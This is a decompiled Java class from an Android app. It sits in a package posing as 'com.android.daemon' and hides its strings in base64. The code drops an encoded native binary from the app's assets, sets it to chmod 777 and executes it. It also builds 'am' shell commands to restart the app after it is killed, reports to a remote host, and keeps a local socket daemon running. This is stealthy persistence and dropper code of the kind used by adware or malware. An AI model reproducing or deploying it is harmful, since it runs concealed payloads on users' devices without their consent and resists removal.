package com.android.daemon;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.Process;
import android.util.Base64;
import com.moceanmobile.mast.MASTNativeAdConstants;
import com.mopub.mobileads.resource.DrawableConstants.CtaButton;
import com.qq.gdt.utils.RWUtils;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;
import org.json.JSONObject;

public class Daemo {
    private static final boolean DEBUG = false;
    /* access modifiers changed from: private|static|final */
    public static final String HOST = E("aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==");
    /* access modifiers changed from: private|static */
    public static AtomicInteger mCount = new AtomicInteger(0);
    private static Intent mRestart = null;
    /* access modifiers changed from: private|static */
    public static ServiceThread mService = null;

    private static class DataThread extends Thread {
        private LocalSocket mClient;
        private Context mContext;
        private DataOutputStream mSocketOutStream;
        private BufferedReader mSocketReader;

        public DataThread(Context context, LocalSocket socket) throws IOException {
            this.mContext = context;
            this.mClient = socket;
            this.mSocketOutStream = new DataOutputStream(socket.getOutputStream());
            this.mSocketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()), 256);
        }

        /* JADX WARNING: Missing block: B:23:0x005b, code skipped:
            r2 = false;
     */
        /* JADX WARNING: Missing block: B:25:?, code skipped:
            r8.mSocketOutStream.writeBytes("EXIT");
            r8.mSocketOutStream.flush();
     */
        public void run() {
            /*
            r8 = this;
            r7 = 0;
            r4 = android.os.Process.myPid();
            r2 = 1;
            r3 = 0;
        L_0x0007:
            r5 = r8.mSocketReader;	 Catch:{ Exception -> 0x0069 }
            r3 = r5.readLine();	 Catch:{ Exception -> 0x0069 }
            if (r3 != 0) goto L_0x0047;
        L_0x000f:
            if (r2 == 0) goto L_0x0016;
        L_0x0011:
            r5 = r8.mContext;	 Catch:{ Exception -> 0x0069 }
            com.android.daemon.Daemo.runBin(r5);	 Catch:{ Exception -> 0x0069 }
        L_0x0016:
            if (r2 == 0) goto L_0x001f;
        L_0x0018:
            r5 = com.android.daemon.Daemo.mCount;
            r5.decrementAndGet();
        L_0x001f:
            r5 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x012b }
            if (r5 == 0) goto L_0x0028;
        L_0x0023:
            r5 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x012b }
            r5.close();	 Catch:{ IOException -> 0x012b }
        L_0x0028:
            r5 = r8.mSocketReader;	 Catch:{ IOException -> 0x012b }
            if (r5 == 0) goto L_0x0031;
        L_0x002c:
            r5 = r8.mSocketReader;	 Catch:{ IOException -> 0x012b }
            r5.close();	 Catch:{ IOException -> 0x012b }
        L_0x0031:
            r5 = r8.mClient;	 Catch:{ IOException -> 0x012b }
            r5.shutdownInput();	 Catch:{ IOException -> 0x012b }
            r5 = r8.mClient;	 Catch:{ IOException -> 0x012b }
            r5.shutdownOutput();	 Catch:{ IOException -> 0x012b }
            r5 = r8.mClient;	 Catch:{ IOException -> 0x012b }
            r5.close();	 Catch:{ IOException -> 0x012b }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
        L_0x0046:
            return;
        L_0x0047:
            r5 = "P:";
            r5 = r3.startsWith(r5);	 Catch:{ Exception -> 0x0069 }
            if (r5 == 0) goto L_0x0007;
        L_0x004f:
            r0 = 0;
            r5 = 2;
            r5 = r3.substring(r5);	 Catch:{ Exception -> 0x00a5 }
            r0 = java.lang.Integer.parseInt(r5);	 Catch:{ Exception -> 0x00a5 }
            if (r4 == r0) goto L_0x00a8;
        L_0x005b:
            r2 = 0;
            r5 = r8.mSocketOutStream;	 Catch:{ Exception -> 0x0069 }
            r6 = "EXIT";
            r5.writeBytes(r6);	 Catch:{ Exception -> 0x0069 }
            r5 = r8.mSocketOutStream;	 Catch:{ Exception -> 0x0069 }
            r5.flush();	 Catch:{ Exception -> 0x0069 }
            goto L_0x0016;
        L_0x0069:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ all -> 0x00c9 }
            if (r2 == 0) goto L_0x0074;
        L_0x006f:
            r5 = r8.mContext;	 Catch:{ all -> 0x00c9 }
            com.android.daemon.Daemo.runBin(r5);	 Catch:{ all -> 0x00c9 }
        L_0x0074:
            if (r2 == 0) goto L_0x007d;
        L_0x0076:
            r5 = com.android.daemon.Daemo.mCount;
            r5.decrementAndGet();
        L_0x007d:
            r5 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x0104 }
            if (r5 == 0) goto L_0x0086;
        L_0x0081:
            r5 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x0104 }
            r5.close();	 Catch:{ IOException -> 0x0104 }
        L_0x0086:
            r5 = r8.mSocketReader;	 Catch:{ IOException -> 0x0104 }
            if (r5 == 0) goto L_0x008f;
        L_0x008a:
            r5 = r8.mSocketReader;	 Catch:{ IOException -> 0x0104 }
            r5.close();	 Catch:{ IOException -> 0x0104 }
        L_0x008f:
            r5 = r8.mClient;	 Catch:{ IOException -> 0x0104 }
            r5.shutdownInput();	 Catch:{ IOException -> 0x0104 }
            r5 = r8.mClient;	 Catch:{ IOException -> 0x0104 }
            r5.shutdownOutput();	 Catch:{ IOException -> 0x0104 }
            r5 = r8.mClient;	 Catch:{ IOException -> 0x0104 }
            r5.close();	 Catch:{ IOException -> 0x0104 }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            goto L_0x0046;
        L_0x00a5:
            r1 = move-exception;
            goto L_0x0016;
        L_0x00a8:
            r5 = com.android.daemon.Daemo.mCount;	 Catch:{ Exception -> 0x0069 }
            r5 = r5.incrementAndGet();	 Catch:{ Exception -> 0x0069 }
            r6 = 1;
            if (r5 <= r6) goto L_0x00fb;
        L_0x00b3:
            r2 = 0;
            r5 = com.android.daemon.Daemo.mCount;	 Catch:{ Exception -> 0x0069 }
            r5.decrementAndGet();	 Catch:{ Exception -> 0x0069 }
            r5 = r8.mSocketOutStream;	 Catch:{ Exception -> 0x0069 }
            r6 = "EXIT";
            r5.writeBytes(r6);	 Catch:{ Exception -> 0x0069 }
        L_0x00c2:
            r5 = r8.mSocketOutStream;	 Catch:{ Exception -> 0x0069 }
            r5.flush();	 Catch:{ Exception -> 0x0069 }
            goto L_0x0007;
        L_0x00c9:
            r5 = move-exception;
            if (r2 == 0) goto L_0x00d3;
        L_0x00cc:
            r6 = com.android.daemon.Daemo.mCount;
            r6.decrementAndGet();
        L_0x00d3:
            r6 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x0118 }
            if (r6 == 0) goto L_0x00dc;
        L_0x00d7:
            r6 = r8.mSocketOutStream;	 Catch:{ IOException -> 0x0118 }
            r6.close();	 Catch:{ IOException -> 0x0118 }
        L_0x00dc:
            r6 = r8.mSocketReader;	 Catch:{ IOException -> 0x0118 }
            if (r6 == 0) goto L_0x00e5;
        L_0x00e0:
            r6 = r8.mSocketReader;	 Catch:{ IOException -> 0x0118 }
            r6.close();	 Catch:{ IOException -> 0x0118 }
        L_0x00e5:
            r6 = r8.mClient;	 Catch:{ IOException -> 0x0118 }
            r6.shutdownInput();	 Catch:{ IOException -> 0x0118 }
            r6 = r8.mClient;	 Catch:{ IOException -> 0x0118 }
            r6.shutdownOutput();	 Catch:{ IOException -> 0x0118 }
            r6 = r8.mClient;	 Catch:{ IOException -> 0x0118 }
            r6.close();	 Catch:{ IOException -> 0x0118 }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
        L_0x00fa:
            throw r5;
        L_0x00fb:
            r2 = 1;
            r5 = r8.mSocketOutStream;	 Catch:{ Exception -> 0x0069 }
            r6 = "OK";
            r5.writeBytes(r6);	 Catch:{ Exception -> 0x0069 }
            goto L_0x00c2;
        L_0x0104:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ all -> 0x0110 }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            goto L_0x0046;
        L_0x0110:
            r5 = move-exception;
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            throw r5;
        L_0x0118:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ all -> 0x0123 }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            goto L_0x00fa;
        L_0x0123:
            r5 = move-exception;
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            throw r5;
        L_0x012b:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ all -> 0x0137 }
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            goto L_0x0046;
        L_0x0137:
            r5 = move-exception;
            r8.mClient = r7;
            r8.mSocketOutStream = r7;
            r8.mSocketReader = r7;
            throw r5;
            */
            throw new UnsupportedOperationException("Method not decompiled: com.android.daemon.Daemo$DataThread.run():void");
        }
    }

    private static class ReportThread extends Thread {
        static final String key = Daemo.E("cmVwb3J0X2FjdGlvbg==");
        private Context mContext;

        public ReportThread(Context context) {
            this.mContext = context.getApplicationContext();
        }

        private static final byte[] read(InputStream in) {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buff = new byte[4096];
            while (true) {
                try {
                    int n = in.read(buff);
                    if (n < 0) {
                        break;
                    }
                    out.write(buff, 0, n);
                    out.flush();
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;
                } finally {
                    try {
                        in.close();
                    } catch (IOException e2) {
                        e2.printStackTrace();
                    }
                }
            }
            return out.toByteArray();
        }

        public void run() {
            SharedPreferences share = this.mContext.getSharedPreferences(Daemo.E("ZGFlbW9uLmtleQ=="), 0);
            if (!share.getBoolean(key, false)) {
                String url = Daemo.HOST + MASTNativeAdConstants.QUESTIONMARK;
                int count = 0;
                do {
                    try {
                        HttpURLConnection http = (HttpURLConnection) new URL(url).openConnection();
                        http.setConnectTimeout(10000);
                        http.setReadTimeout(5000);
                        InputStream in = http.getInputStream();
                        if (http.getResponseCode() == CtaButton.WIDTH_DIPS) {
                            byte[] data = read(in);
                            if (data != null) {
                                if ("true".equals(new JSONObject(new String(data, "utf-8")).optString("success"))) {
                                    share.edit().putBoolean(key, true).commit();
                                    count++;
                                    return;
                                }
                            }
                        }
                        count++;
                    } catch (Exception e) {
                        count++;
                    } catch (Throwable th) {
                        count++;
                        throw th;
                    }
                } while (count < 3);
            }
        }
    }

    private static class ServiceThread extends Thread {
        private boolean isDaemon = true;
        private Context mContext;
        private LocalServerSocket mSocket;

        public ServiceThread(Context context) throws IOException {
            super("Daemon");
            this.mContext = context.getApplicationContext();
            this.mSocket = new LocalServerSocket(context.getPackageName());
        }

        public synchronized void start() {
            this.isDaemon = true;
            super.start();
        }

        public synchronized void stopService() {
            this.isDaemon = false;
            try {
                this.mSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return;
        }

        public void run() {
            try {
                Daemo.runBin(this.mContext);
                while (this.isDaemon) {
                    LocalSocket client = this.mSocket.accept();
                    if (client != null) {
                        new DataThread(this.mContext, client).start();
                    }
                }
            } catch (IOException e1) {
                e1.printStackTrace();
            } finally {
                this.isDaemon = false;
                this.mSocket = null;
                Daemo.mService = null;
            }
        }
    }

    public static final boolean startMonda(Context context, Intent restart) {
        try {
            if (mService == null) {
                mService = new ServiceThread(context);
                mRestart = restart;
                new ReportThread(context).start();
            }
            if (!mService.isAlive()) {
                mService.start();
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static final String E(String s) {
        return new String(Base64.decode(s, 0));
    }

    public static final void stopMonda() {
        mService.stopService();
    }

    /* access modifiers changed from: private|static|final */
    public static final boolean runBin(Context context) {
        File root = new File(new StringBuilder(String.valueOf(E("L2RhdGEvZGF0YS8="))).append(context.getPackageName()).toString());
        File f = new File(root, E("ZGFlbW9u"));
        File t = new File(root, E("ZGFlbW9uLnQ="));
        if (f.exists()) {
            f.delete();
        }
        try {
            InputStream in = context.getAssets().open(E("ZGFlbW9u"));
            RWUtils.decode(in, t);
            in.close();
            t.renameTo(f);
            if (!f.exists()) {
                return false;
            }
            String[] cmd = mRestart == null ? new String[]{f.getPath(), "-p", context.getPackageName(), "-h", HOST} : new String[]{f.getPath(), "-p", context.getPackageName(), "-r", getRestartCMD(context, mRestart), "-h", HOST, "-i", Process.myPid()};
            try {
                try {
                    Runtime.getRuntime().exec(new StringBuilder(String.valueOf(E("Y2htb2QgNzc3IA=="))).append(f.getPath()).toString()).waitFor();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Runtime.getRuntime().exec(cmd, null);
                return true;
            } catch (Exception e2) {
                return false;
            }
        } catch (Exception e3) {
            if (!f.exists()) {
            }
            return false;
        } catch (Throwable th) {
            if (!f.exists()) {
                return false;
            }
        }
    }

    private static final String getRestartCMD(Context context, Intent intent) {
        if (intent == null) {
            return null;
        }
        Class<?> cls;
        ComponentName cn = intent.getComponent();
        if (cn == null) {
            cls = null;
        } else {
            try {
                cls = Class.forName(cn.getClassName());
            } catch (ClassNotFoundException e) {
                return null;
            }
        }
        if (cls == null || BroadcastReceiver.class.isAssignableFrom(cls)) {
            return new StringBuilder(String.valueOf(E("YW0gYnJvYWRjYXN0IC0tdXNlciAwIC1hIA=="))).append(intent.getAction()).append(E("IC1mIDMyIC1lIGtleSBkYWVtb24=")).toString();
        }
        if (Service.class.isAssignableFrom(cls)) {
            return new StringBuilder(String.valueOf(E("YW0gc3RhcnRzZXJ2aWNlICAtLXVzZXIgMCAtbiA="))).append(cn.flattenToString()).append(E("IC1lIGtleSBkYWVtb24=")).toString();
        }
        if (!Activity.class.isAssignableFrom(cls)) {
            return null;
        }
        StringBuffer cmd = new StringBuffer(E("YW0="));
        cmd.append(E("IHN0YXJ0IC0tdXNlciAwIA=="));
        cmd.append(" -n ").append(cn.flattenToString());
        String action = intent.getAction();
        if (action != null) {
            cmd.append(" -a ").append(action);
        }
        if (intent.getData() != null) {
            cmd.append(" -d ").append(intent.getData());
        }
        Set<String> cat = intent.getCategories();
        if (cat != null) {
            for (String c : cat) {
                cmd.append(" -c ").append(c);
            }
        }
        if (intent.getFlags() > 0) {
            cmd.append(" -f ").append(intent.getFlags());
        }
        return cmd.toString();
    }
}
